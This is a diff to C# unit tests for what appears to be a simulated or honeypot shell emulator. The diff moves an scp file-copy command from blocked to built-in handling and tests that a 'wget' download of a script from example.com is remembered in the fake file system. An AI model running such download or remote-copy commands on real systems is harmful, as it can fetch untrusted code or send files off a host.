@@ -584,7 +584,7 @@ public class CommandResolverTests
     [InlineData("ps", "StaticDataset")]
     [InlineData("ls /var/log", "StaticDataset")]
     [InlineData("ifconfig", "StaticDataset")]
-    [InlineData("scp /tmp/a remote:/tmp/a", "Blocked")]
+    [InlineData("scp /tmp/a remote:/tmp/a", "BuiltIn")]
     public void ClassifyCommand_ShortCircuitsSimpleCommands(string command, string expectedPath)
     {
         var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
@@ -826,6 +826,58 @@ public class CommandResolverTests
         Assert.Equal(0, promptTokens);
         Assert.Equal(0, completionTokens);
         Assert.Equal("/home/remote", fs.CurrentDirectory);
+    }
+
+    [Fact]
+    public async Task ResolveCommand_RemembersDownloadedAndWrittenFiles()
+    {
+        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
+        var history = new List<ChatRequestData.ChatMessage>();
+        var sessionId = Guid.NewGuid().ToString("N");
+
+        await CommandResolver.ResolveCommandAsync(
+            "cd /tmp; wget http://example.com/a.sh -O /tmp/a.sh; echo ready >> /tmp/a.sh",
+            sessionId,
+            sessionId,
+            fs,
+            history,
+            CancellationToken.None);
+
+        var (response, usedStatic, rateLimited, promptTokens, completionTokens) = await CommandResolver.ResolveCommandAsync(
+            "cat /tmp/a.sh",
+            sessionId,
+            sessionId,
+            fs,
+            history,
+            CancellationToken.None);
+
+        Assert.Contains("downloaded payload placeholder", response);
+        Assert.Contains("ready", response);
+        Assert.False(rateLimited);
+        Assert.False(usedStatic);
+        Assert.Equal(0, promptTokens);
+        Assert.Equal(0, completionTokens);
+    }
+
+    [Fact]
+    public async Task ResolveCommand_ScpCommandIsNotBlocked()
+    {
+        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
+        var history = new List<ChatRequestData.ChatMessage>();
+
+        var (response, usedStatic, rateLimited, promptTokens, completionTokens) = await CommandResolver.ResolveCommandAsync(
+            "scp /tmp/a remote:/tmp/a",
+            Guid.NewGuid().ToString("N"),
+            Guid.NewGuid().ToString("N"),
+            fs,
+            history,
+            CancellationToken.None);
+
+        Assert.Equal("", response);
+        Assert.True(usedStatic);
+        Assert.False(rateLimited);
+        Assert.Equal(0, promptTokens);
+        Assert.Equal(0, completionTokens);
     }
 
     [Fact]
